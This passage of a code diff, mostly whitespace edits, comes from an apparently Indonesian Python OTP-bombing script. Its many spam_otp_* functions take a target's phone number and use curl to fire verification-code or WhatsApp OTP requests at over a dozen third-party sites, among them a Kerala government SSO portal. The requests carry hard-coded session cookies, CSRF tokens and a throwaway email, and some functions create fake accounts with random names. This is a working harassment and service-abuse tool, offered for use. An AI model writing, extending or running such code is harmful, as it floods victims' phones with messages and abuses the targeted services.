cf_clearance=WGR.MGEa4UU0ZxdEVIwLOv5sfHpdgKnUG916yHcVigE-1784474119-1.2.1.1-tsze3pbi8pCNyF_J11EryCZz7P78u_cYluNy.PNJBIxYh9zhM4_pto2BBAd6f65.6CuMSSQPLuRQojy5gGtMYqvp_vfm1IQ9W42VuDhBETtRR9OiJf6B7y4gP0JwKHEXZkFbfNugtKdonoXSQmezhr.gX1a8LpuEUwKb_1ebP_AKmck6z0YnBK6zfxZsaptPT24wViudMt7eTeo8zJcUwRuAsW2kiMR5xj2kL774YNdaS8ZZpfc8BmSOGQt64sCVT9Jy9wT0W9LKcRVqoUH0Xht_8F68VYi5I29VIrK4OSVRTSrT..RNpyZXmxknlYkZHZOTQzLqKgSZQ5_nlUSgFg; __cf_bm=N.yhTYi6ikXVdOVLPWJrfc4gfnJqvkHA4pysnjPjp9k-1784474119.371274-1.0.1.1-GQ.D5nngKtBUGDeO5ueyHgFNNdWXLHdxtsxcUE63Tnpyx4wSdsy2yplAjPoQOly7gwY36P9bonbnnEoUMfvlAJP2DFAhfQspOpEhms6XXUsD1.9ejWiU3nk_RQXiSiGq; scarab.visitor=%22195488A3EF1F1312%22; hardwareId=EMS2D-AF23A_4955e428-f3e9-43db-8d3a-7e0c71350f52; _gcl_au=1.1.1919541313.1784098500.-.-.1784474130.450855288.1784474131.1784474130; mycookies=s7; system_token=uSiiHEFq6k_cwJDq-Kn_sV0csNc; ttcsid=1784474133713::0WWL-1SZUwys7jVXthPb.2.1784474138259.0::1.-20188.213::4440.2.440.578::0.0.0; ttcsid_C6FGON96L5602R4VI2T0=1784474133705::vmd0mCMg8vz-zJIItvYq.2.1784474138260.0; ttcsid_D2I412BC77U9B02M0UGG=1784474133725::W9t_dL9b1tFKGthRORIF.2.1784474138261.0; _ga_RB1QMC9XF8=GS2.1.s1784474131$o2$g0$t1784474138$j53$l0$h1755439970'
         }
-        
+
         payload = {
             "phoneNumber": phone,
             "isCheckOtpLimit": False,
             "uniqueID": phone,
             "isLogin": False
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code == 200
-        
+
     except Exception as e:
         return False
 
@@ -4530,7 +4532,7 @@ def spam_otp_carro(phone):
         return False
     except:
         return False
-        
+
 def spam_otp_amaha(nomor):
     try:
         if nomor.startswith('0'):
@@ -4541,17 +4543,17 @@ def spam_otp_amaha(nomor):
             nomor = nomor[3:]
         else:
             nomor = nomor
-        
+
         nomor = ''.join(filter(str.isdigit, nomor))
-        
+
         if nomor.startswith('0'):
             nomor = nomor[1:]
-        
+
         import subprocess
         import json
-        
+
         url = f"https://api.theinnerhour.com/v1/get_otp?country_code=62&mobile_country=Indonesia&mobile={nomor}&login=yes"
-        
+
         curl_cmd = f"""curl -s -X GET '{url}' \\
   -H 'accept: */*' \\
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
@@ -4569,9 +4571,9 @@ def spam_otp_amaha(nomor):
   -H 'platform: mobile' \\
   -H 'x-country: IN' \\
   -H 'x-timezone: Asia/Jakarta'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -4583,7 +4585,7 @@ def spam_otp_amaha(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -4597,12 +4599,12 @@ def spam_otp_idealz(nomor):
             nomor = nomor[3:]
         else:
             nomor = nomor
-        
+
         nomor = ''.join(filter(str.isdigit, nomor))
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""curl -s -X POST 'https://www.idealzlebanon.com/on/demandware.store/Sites-idealz-lb-Site/en/Gupshup-SmsAuthWeb' \\
   -H 'host: www.idealzlebanon.com' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -4621,9 +4623,9 @@ def spam_otp_idealz(nomor):
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
   -H 'priority: u=1, i' \\
   --data-raw 'phoneNumber={nomor}&countryCode=%2B62&isApp=false&mode=whatsapp'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -4633,10 +4635,10 @@ def spam_otp_idealz(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
-        
+
 def spam_otp_myvalue(nomor):
     try:
         if nomor.startswith('0'):
@@ -4647,18 +4649,18 @@ def spam_otp_myvalue(nomor):
             nomor = nomor
         else:
             nomor = '62' + nomor
-        
+
         nomor = ''.join(filter(str.isdigit, nomor))
-        
+
         import subprocess
         import json
-        
+
         payload = json.dumps({
             "username": nomor,
             "template": "myvalue",
             "sendProvider": "whatsapp"
         })
-        
+
         curl_cmd = f"""curl -s -X POST 'https://auth.myvalue.id/v2/verification/send' \\
   -H 'host: auth.myvalue.id' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -4676,9 +4678,9 @@ def spam_otp_myvalue(nomor):
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
   -H 'priority: u=1, i' \\
   -d '{payload}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -4690,7 +4692,7 @@ def spam_otp_myvalue(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -4704,15 +4706,15 @@ def spam_otp_joob(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('0'):
             phone = '0' + phone
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""curl -s -X POST 'https://api.joob.asia/v3/auth/otp/issue' \\
   -H 'host: api.joob.asia' \\
   -H 'x-platform: MOBILE_WEB' \\
@@ -4734,9 +4736,9 @@ def spam_otp_joob(nomor):
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
   -H 'priority: u=1, i' \\
   -d '{{"otpAuthType":"PHONE","phoneNumber":"{phone}"}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -4750,10 +4752,10 @@ def spam_otp_joob(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
-        
+
 def spam_otp_datascripmall(nomor):
     try:
         if nomor.startswith('0'):
@@ -4764,17 +4766,17 @@ def spam_otp_datascripmall(nomor):
             phone = nomor
         else:
             phone = '+62' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('62'):
             phone = '62' + phone
-        
+
         phone = '+' + phone
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""curl -s -X POST 'https://datascripmall.id/api/app/buyer/register/request-otp' \\
   -H 'host: datascripmall.id' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -4793,9 +4795,9 @@ def spam_otp_datascripmall(nomor):
   -H 'cookie: _ga=GA1.1.657807458.1785422889; moe_uuid=5cefeacf-f41d-4d22-8644-578bb5a6751e; _fbp=fb.1.1785422886169.83826567122468884.AQYAAQIB; _gcl_aw=GCL.1785423521.CjwKCAjw7KvTBhA6EiwAWnutYZTFUrVgZnPcuE2Vm8b1x-lclJCkOgLxSOZXqD9XVffjvY0oVuRyGRoCdqYQAvD_BwE; _gcl_gs=2.1.k1$i1785423512$u152165420; __Host-next-auth.csrf-token=293c40a1d89e1ebf1f65529dae844021c68bf527b9010349cba333fad1321d6c%7C89d0644d6e9f85d2222e64176b6f94408161531bceedf2cc64dde51ddd332cc4; __Secure-next-auth.callback-url=https%3A%2F%2Fdatascripmall.id; last_visited_page=%2F; _gcl_au=1.1.782293264.1785422888.-.-.1785422889.136969314.1787146397.1787146396; _ga_ZRQCEHEE7M=GS2.1.s1787146396$o2$g1$t1787146435$j21$l0$h0' \\
   -H 'priority: u=1, i' \\
   -d '{{"email":"Tono34Jo80byats@gmail.com","phone_number":"{phone}","channel":"wa"}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -4807,7 +4809,7 @@ def spam_otp_datascripmall(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -4821,17 +4823,17 @@ def spam_otp_rivafashion(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('0'):
             phone = '0' + phone
-        
+
         import subprocess
         import json
-        
+
         form_key = "JKiGdrKGYAkW2J8p"
-        
+
         curl_cmd = f"""curl -s -X POST 'https://www.rivafashion.com/en/web/register/send' \\
   -H 'host: www.rivafashion.com' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -4851,9 +4853,9 @@ def spam_otp_rivafashion(nomor):
   -H 'cookie: PHPSESSID=8j7i0etigbuoe10vqtjttoimo7; form_key=JKiGdrKGYAkW2J8p; mage-messages=; popup-timing=0; homepagecountrylangmodal=yes; user_allowed_save_cookie=%7B%221%22%3A1%7D; unbxd.userId=uid-1786008968826-52393; unbxd.visit=first_time; unbxd.visitId=visitId-1786008968840-95946; moe_c_s=1; _fbp=fb.1.1786008970673.274662173564343403; _ga=GA1.1.1840547569.1786008971; _twpid=tw.1786008971673.899374785113090323; _gcl_au=1.1.1404030908.1786008972; moe_uuid=264fe380-7149-4bee-9e60-00833114b93b; cto_bundle=BB_lVF9IaWpNUHklMkI4NWNQVUdqdkdMTGc5VmY5c0pZVTl6aGRhMWxKZTFWT3h6ZFZtaGlJWGVBQjdIZDglMkIlMkZhU0NGTCUyRlBiM2Naa0ZpeGJvTVdJWiUyQjdnUHJXVWcwZnh2cWFvMDBLTUpONnpDWUJGTTg4MWNFMjRlamNBJTJGN1NLZ2piczJrYkplZDZPTVglMkZQQkxQZHZUJTJCNm9MT1hRJTNEJTNE; _tt_enable_cookie=1; _ttp=01KZB6WBTW26NYM8K3P9V73DWQ_.tt.1; moe_u_d=Hcc7CoAwDADQu2Q2Q-wH62VKahIQCoK1k3h3S8f3QstXFdiNa9MFJLOIj93n-znAJAYWwoenW4BfaGEbIdDKTGuRokCGXw_; moe_s_a_s=5; moe_o_s_t=1786008975067; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-banners-cache-storage=%7B%7D; _scid=WsV9gSuqkOO3v9yeQPJoKkvaOQgORiT1; selected_country=yes; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; moe_s_d=DY7LjoIwAEX_petRgyBBdpRHRRgVBRQ2phQYXpYKRWZi_Pfp6uYmN_ecN8iBDirO2aivVvM8L4f6hUs8VnVPl6R_gC_AxSK3OhxRSotdrxsnYytl9uT4WnM_PinRnHK-yujBh2RMShkTvD5PpuznSXqT4i5o7dgyeMGulqog_lsRNPrwQG5ZmBot4tc2I1HZSdDkd9eqpKdaexEk-Oa1qjuwTdieA0-pk8Hc0pRFC2jIG_J3LqBb5EKvEHqlyBbob8BEgYaaHeKqiboLKue1Ju_oWJmXeB_IP0oy7oOpRuGFO_vBtVplF_dH7RU3UnP0vx1HLil6TqekG0a25kZ2V02cJ6iuIoHA4p2EBWkcR7IX0DZZ5_kpgzgAn88_; rivacategory=6227; referrer=www.rivafashion.com; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22w2J8YXRV0e0SHnDBgZLV%22%2C%22expiryDate%22%3A%222027-08-06T09%3A36%3A37.574Z%22%7D; moe_s_n=PcpBDoMwDETRu3idSB6XJIarVJVFIyNVVdtF2FXcHcKC5bz5f2r2polYMeYZOS41zXFwQdQqHuEoz8VFExKFI2620oSimVnHIkVuXT-nKnOgai9b-7w_-uNXD1bGoAj0tZ-1Q7cd; _ga_7K2P0W12ET=GS2.1.s1786008971$o1$g1$t1786009001$j30$l0$h0; moe_h_a_s=1; _scid_r=U0V9gSuqkOO3v9yeQPJoKkvaOQgORiT1C-p1aQ; private_content_version=f4210cb5f2c0ea6d1249c78e962f93f6; section_data_ids=%7B%22messages%22%3A1786009132%7D; ttcsid=1786008973225::TC4pCvDydHRHBuVJLI15.1.1786009132053.0::1.-4944.28677::158776.27.231.747::109090.3.9; ttcsid_CCDJ753C77U0P3N5FH9G=1786008973218::sUXaI8Qyy66gbrdU81p3.1.1786009132053.1' \\
   -H 'priority: u=1, i' \\
   --data-raw 'mobile_number={phone}&phone_code=%2B62&form_key={form_key}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -4865,7 +4867,7 @@ def spam_otp_rivafashion(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 def spam_otp_buccheri(nomor):
@@ -4878,12 +4880,12 @@ def spam_otp_buccheri(nomor):
             phone = nomor[3:]
         else:
             phone = nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""curl -s -X POST 'https://member.buccheri.com/otp-sent' \\
   -H 'host: member.buccheri.com' \\
   -H 'cache-control: max-age=0' \\
@@ -4905,9 +4907,9 @@ def spam_otp_buccheri(nomor):
   -H 'cookie: _ga=GA1.1.517445661.1786009922; _clck=umhr0c%5E2%5Eg8d%5E0%5E2409; _clsk=furbu5%5E1786009926484%5E1%5E1%5Ez.clarity.ms%2Fcollect; _ga_4FSQVMN5FX=GS2.1.s1786009922$o1$g1$t1786009978$j4$l0$h0; ci_session=091bc4bfe7b2c6ab4427214bfbe54337138963cd' \\
   -H 'priority: u=0, i' \\
   --data-raw 'phonenumber={phone}&otptype=SIGNUP'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -4919,7 +4921,7 @@ def spam_otp_buccheri(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -4933,15 +4935,15 @@ def spam_otp_jec(nomor):
             phone = nomor
         else:
             phone = '62' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         import subprocess
         import json
-        
+
         token = "qfKK4y73SkCXC5MhZlI70Ivw5Xqe1i0cjrbBxK1p"
         rdr = "eyJpdiI6InczVHdsQ2NwZzJjQ1JWVGhDQ1FZK0E9PSIsInZhbHVlIjoiTnU5RXF0WWNWUCs5Slc4MnM1eXBxT2kxQmhlTW1sVHl4UmJKMGg3RVIzST0iLCJtYWMiOiI2NjBkZTk1MjQyMTE3NTI4MGVlMTBkMzIwNzVkZGY5MjBjMTI1ZGVlMGRkMGUyMWZkZWVhZmEyZTU4Yzk0NDIyIiwidGFnIjoiIn0%3D"
-        
+
         curl_cmd = f"""curl -s -X POST 'https://jec.co.id/id/login-via-otp' \\
   -H 'host: jec.co.id' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -4960,9 +4962,9 @@ def spam_otp_jec(nomor):
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
   -H 'cookie: _ga=GA1.3.755083444.1786010701; _gid=GA1.3.1346297291.1786010702; _fbp=fb.2.1786010702252.193345616220197204; _clck=40kett%5E2%5Eg8d%5E0%5E2409; moe_uuid=eed3e8e0-f7fb-43d9-b932-9dd06765b995; _clsk=1br6z3c%5E1786010704900%5E1%5E1%5Ez.clarity.ms%2Fcollect; _ga_VW5EHP2HBV=GS2.1.s1786010701$o1$g1$t1786010718$j43$l0$h0; _gcl_au=1.1.916045630.1786010701.-.-.1786010719.883151778.1786010719.1786010727; XSRF-TOKEN=eyJpdiI6Ii9kY0VzVUZNS09vTU5LWHlKNHA5SEE9PSIsInZhbHVlIjoiOWQ3R053U3ExVW80TjJlMXEzRVJIWDhoQnRjOU92TzJIVHNqU3ltWThZcDVQd1JKVi9Xeng1K0lHOGNvcHJsMHpGVEl0elI5YSt1SS93MWpWdVV6SDZjbTJES281ZlV6WGQybmIxQVEvMEpMTDdqNW83d3ZuTXN6czZTSDFoUy8iLCJtYWMiOiJhNWNjNDc1YTk2ZmUzZDVkZDQ0Y2E3OTUwMjU5NTJmMmI0ZjBhNzJhZDdiMGFhNmE2MDM1MzZhYTA3ZWFkZGU2IiwidGFnIjoiIn0%3D; jec_fe_production_session=eyJpdiI6ImVFMUZ5Wk00NXk1OXBEbHJobnhKenc9PSIsInZhbHVlIjoiRmU4ZUlQSWVxcjFDVXF3dkFIYWlyR290UlROZEVINFIvZ0ltWkYvcU1NcDVxVVQ3bVVwclhxTkMwSFg1d2Eyd1BCQ1d2YThUckt4QTJVdEhzNXl0UVZCbGdJTWpTck5wV2hBM2RlMzFIazZycjdsQVNpZ3pWYzFxd25McXJxL1QiLCJtYWMiOiIwNzBiMzY4NzQ2NTA3NmU2YjUxMThkOThhMGE2MGNhZmIwODM2YzBmMmU2NTI4ZWI2OWE3ZGNiNzgxYzUxYjU0IiwidGFnIjoiIn0%3D' \\
   --data-raw '_token={token}&loginparam=&rdr={rdr}&mobile={phone}&remember_me=1&tos=1&otp%5B%5D=&otp%5B%5D=&otp%5B%5D=&otp%5B%5D='"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -4974,7 +4976,7 @@ def spam_otp_jec(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -4988,23 +4990,23 @@ def spam_otp_generasimaju(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('0'):
             phone = '0' + phone
-        
+
         import subprocess
         import json
         import base64
         import random
         import string
-        
+
         firstname = ''.join(random.choices(string.ascii_lowercase, k=8))
         password = base64.b64encode(f"{firstname}12345".encode()).decode()
         csrf_token = "1a6d98f9901ed40ce571b56fa1d47869841a4eda"
         auth_token = "8af3153c67f9b3faf620b64706e18c08"
-        
+
         curl_cmd = f"""curl -s -X POST 'https://www.generasimaju.co.id/klub-generasi-maju/register' \\
   -H 'host: www.generasimaju.co.id' \\
   -H 'x-newrelic-id: UA4HUV5TARAEUFFVAQQEUFY=' \\
@@ -5029,9 +5031,9 @@ def spam_otp_generasimaju(nomor):
   -H 'cookie: prev_page_url=/; data_layer_method=Website; TCPID=126831854422550661387; _gid=GA1.3.2087259638.1787136887; _gat_UA-103522697-4=1; _tt_enable_cookie=1; _ttp=01M0CTHJ7ZZ53RDS1MBZ8F9B69_.tt.2; _clck=1lemkln%5E2%5Eg8q%5E0%5E2422; __stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiJlOTUxYzg1NC0zYzQzLTQxMDYtYWFlYS1iYzY0N2I2NmVhODIifQ%3D%3D; _td_ssc_id=01M0CTHMEQHN4WM22AN96N2MD6; __stgeo=IjAi; __stbpnenable=MA%3D%3D; __stdf=MA%3D%3D; PHPSESSID=d7f6086225b836d265dc047dc6526a3b; _fbp=fb.2.1787136896361.715334083778519977; iDSP_Cookie=0abf53f9-e262-4b2b-8a4a-739b0d159f83**1787136896679*8e2f9123e95944449a39a9a80babf9e4*; _ga=GA1.3.1942976718.1787136886; _td=b724781d-c825-49e6-91e0-23b4e09740b8; __sts=eyJzaWQiOjE3ODcxMzY4ODgzNjksInR4IjoxNzg3MTM2ODk5MDUzLCJ1cmwiOiJodHRwcyUzQSUyRiUyRnd3dy5nZW5lcmFzaW1hanUuY28uaWQlMkZrbHViLWdlbmVyYXNpLW1hanUlMkZyZWdpc3RlciUzRnJlZmVycmFsJTNEaHR0cHMlM0ElMkYlMkZ3d3cuZ2VuZXJhc2ltYWp1LmNvLmlkJTJGIiwicGV0IjoxNzg3MTM2ODk5MDUzLCJzZXQiOjE3ODcxMzY4ODgzNjksInBVcmwiOiJodHRwcyUzQSUyRiUyRnd3dy5nZW5lcmFzaW1hanUuY28uaWQlMkYiLCJwUGV0IjoxNzg3MTM2ODg4MzY5LCJwVHgiOjE3ODcxMzY4ODgzNjl9; _clsk=1l4an9c%5E1787136899807%5E2%5E1%5Eu.clarity.ms%2Fcollect; ttcsid_C4RIGKH6H18A0MH113T0=1787136887112::rCra0ykXy8_h7KsBM04x.1.1787136940557.1; ttcsid=1787136887119::o07SA2cbudxtC_Hsy8Yh.1.1787136940557.0::1.5427.11326::53296.11.324.1008::52530.9.297; _ga_KHHX33L6LL=GS2.1.s1787136886$o1$g1$t1787136940$j6$l0$h0; _gcl_au=1.1.1934825587.1787136884.805340981.1787136911.1787136910.1774024647.1787136891.1787136940; AWSALB=8iHBwm8IsmPXi2jxCtanEqkh0JjDaTqSPbmE916vmlFGE7miEu74AWb7HbujI5pbsSM91e5NQDNiPOkwU8OVf6ETe6nVzjkaTg2rjz5r2afzGw2JZRrPMJSS+xvy8SDN9TTeNCsEVlbj5wh+3L1Rez0aFheHI4kfDc+LNyUN4zf6s3p4YoBM8JF+etwf2A==; AWSALBCORS=8iHBwm8IsmPXi2jxCtanEqkh0JjDaTqSPbmE916vmlFGE7miEu74AWb7HbujI5pbsSM91e5NQDNiPOkwU8OVf6ETe6nVzjkaTg2rjz5r2afzGw2JZRrPMJSS+xvy8SDN9TTeNCsEVlbj5wh+3L1Rez0aFheHI4kfDc+LNyUN4zf6s3p4YoBM8JF+etwf2A==' \\
   -H 'priority: u=1, i' \\
   --data-raw 'firstname={firstname}&msisdn={phone}&password={password}&mother_status=7&ispregnant=Y&pregnancyweek=1&isonpregnancyprogram=N&children_dob=&is_code_refferal_event_code=&refferal_code_event_code=&query_params%5B0%5D%5Breferral%5D=https%3A%2F%2Fwww.generasimaju.co.id%2F&auth_token={auth_token}&auth_token_prefix=registration'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -5045,7 +5047,7 @@ def spam_otp_generasimaju(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -5059,15 +5061,15 @@ def spam_otp_norkaroots(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('0'):
             phone = '0' + phone
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""curl -s -X POST 'https://sso.norkaroots.kerala.gov.in/send-whatsapp-otp' \\
   -H 'host: sso.norkaroots.kerala.gov.in' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -5088,9 +5090,9 @@ def spam_otp_norkaroots(nomor):
   -H 'cookie: XSRF-TOKEN=eyJpdiI6Ik9oc3lDS1R2ZzJCWjJDY25sQ1FVcVE9PSIsInZhbHVlIjoiWkRMWFhQUHlBNHFvUTF3TmoybC90MHZiRzE1ekN1RUtBUDYxTUpYT0FXalBoVnp2MFdOYldUaGFlY2lzSkNINFNmUGloTEdSMU9YUHY4M045TEFnREcyK2pNTk5manIvM1ZtRmc4Sk1vZ3FacE5mQmN5NXVlZVdXYVFtZ1BubWwiLCJtYWMiOiI4M2QzZjc5YzljNjVkZDJiNGQxOGRmY2RhMmUyMTQ1NTQ2YjQ4NTBiYmRmMjA1OGRlM2I3ZmNlYWM5ZGRmYTZjIiwidGFnIjoiIn0%3D; norka_roots_sso_portal_session=eyJpdiI6ImtxUG9GTXVtTXkxVWxra2NWSkhvR2c9PSIsInZhbHVlIjoiTnlKeEkyNUVKOXBha3pETDgySzBnNDg2STRYTXU3ZnNFemxabnIvZHBrVzFrNFloK05Ea2EzVzJOaGhsbWRXQlJNbWFKNi9ENzJZb1RvTUxGbzNNSjQ5Q0szVzZvZURTOG02VmZDakF4SDVRWEF5SDZPZkhoSzJxWWhKTU9oTGMiLCJtYWMiOiIwMjJiZjY5MWU4OTkxZjAxNzNkMzM3OWI1ODYwZWQwOWY0ZjllYWNkMTFkOTMzNDdmMDNlZWFmOTdkODM4MTI5IiwidGFnIjoiIn0%3D' \\
   -H 'priority: u=1, i' \\
   --data-raw 'whatsapp_number={phone}&whatsapp_country_code=62&whatsapp_country_iso_code=id'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -5102,7 +5104,7 @@ def spam_otp_norkaroots(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -5116,19 +5118,19 @@ def spam_otp_kpoin(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('0'):
             phone = '0' + phone
-        
+
         import subprocess
         import json
         import random
         import string
-        
+
         otp_type = ''.join(random.choices(string.digits, k=6))
-        
+
         curl_cmd = f"""curl -s -X POST 'https://app.kpoin.com/api/bff/v1/notification/sendotp' \\
   -H 'host: app.kpoin.com' \\
   -H 'applicationbrand: 0' \\
@@ -5151,9 +5153,9 @@ def spam_otp_kpoin(nomor):
   -H 'cookie: visid_incap_3193850=KSLZkw3rSLCIdgxnG1LswfKchWoAAAAAQUIPAAAAAADtP1pV9DavhkjEGjxo5FyR; incap_ses_735_3193850=cukdVA7pdgcKbznhtD4zCvKchWoAAAAAHsqxaKqc92iy2SZvSmff8Q==; incap_ses_1746_3193850=Ma70GopLew+tpns7ZQo7GPachWoAAAAAIbXttysbxxBFyqv+jfrzDA==; _ga=GA1.1.1435000739.1787141371; _fbp=fb.1.1787141372954.767928535296203971; _tt_enable_cookie=1; _ttp=01M0CYTF8JWD243X9ZGVY2FH98_.tt.1; androidBannerClosed=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoidHJ1ZSIsImlhdCI6MTc4NzE0MTM3OCwiZXhwIjoxNzg3NDAwNTc4fQ.m3crPZsDXe4smAhYEWNhOFOdEm3VkxWt3lMiC8AC1DU; _ga_XH6QC1GPNY,G-FCEP7R9YXY,G-E0QWTN64ED=GS2.1.s1787141390$o1$g0$t1787141390$j60$l0$h0; _ga_XH6QC1GPNY=GS2.1.s1787141371$o1$g1$t1787141397$j34$l0$h752977670; _gcl_au=1.1.1659628713.1787141369.-.-.1787141371.1651972348.1787141372.1787141397; _ga_E0QWTN64ED=GS2.1.s1787141371$o1$g1$t1787141398$j33$l0$h455275594; _ga_FCEP7R9YXY=GS2.1.s1787141372$o1$g1$t1787141398$j34$l0$h139101688; _Tk=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImFjY2Vzc1Rva2VuIjoiZTJhZTkyZWQzZDVkZTM1YzQyNGEyZDM4YmI0MmE2N2I0ZGMzMjIzOTg5ZGJiMTRiMTg3ZjIzMmUwYzRhYTFlYzAxZWNlMmYxYzlkODJiMmVlZDc1YzY4Yzk1NGFmYjdhZjc1ODJkYTAzM2Y4ZTgwYmQyZjY3YWQwMTYxMzYzMzU4OGFjNTY4ZWY2OGQyNGUwOWMxZGQ4ZDA1MjQxYmFiM2Q1NGE0MjBiMzNmYzBlYWZiYWYyOGUwM2Q5ZjIzZTQ5YjFiNjc1YzhjNDNhMjA3NDAyNjhiZDIyMmRjNDNjZGMxOTc5YTM2ZjcxOTY0ZmMzZjE3MDc0MGM5Y2RkZWZlYWY0Njg3YTY5Yzk0MjZmMDM0OGYzNDUwZTg5OGM0YWI2NjQ0ZTE5YzJhMDdjYzM4Zjk4NzU1ZmM4NGU5YzI4MGJiYmVmZmYwYzFhM2Q0NDQyNTAxYzVlYTgyZTMzY2VmZTM5MzViNjk4ZmJjOWVjOWRkYTRlNWEwYiIsImV4cGlyZWQiOiI2MzkyMjczOTQwMDAwMDAwMDAifSwiaWF0IjoxNzg3MTQxNDAwLCJleHAiOjE3ODc0MDYwMDB9.AzOTIf9SzmaSe0MYRiTGUK6RHhp4UD30NVunGF-SBhY; ttcsid=1787141373225::bgd_SWk9Rs6CgIaLfruw.1.1787141420005.0::1.19758.25594::46657.5.361.870::0.0.0; ttcsid_CRBTL1JC77U6RBG4JJL0=1787141373222::USQsoHY5IKaPHuP-dQ7i.1.1787141420006.1; _Ureg=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7IlBob25lTm8iOiIwODM4MzIxMTA1MDkiLCJSZWZlcnJhbENvZGUiOiIifSwiaWF0IjoxNzg3MTQxNDIwLCJleHAiOjE3ODc0MDA2MjB9.xvsHxg22HWujKk9ueKqr_dmmR3_uJE-w86tS4sBLy7w' \\
   -H 'priority: u=1, i' \\
   -d '{{"UniqueID":"{phone}","NotifType":"109104","OtpType":"{otp_type}","OtpDigit":6}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -5165,7 +5167,7 @@ def spam_otp_kpoin(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -5179,17 +5181,17 @@ def spam_otp_99co(nomor):
             phone = nomor
         else:
             phone = '+62' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
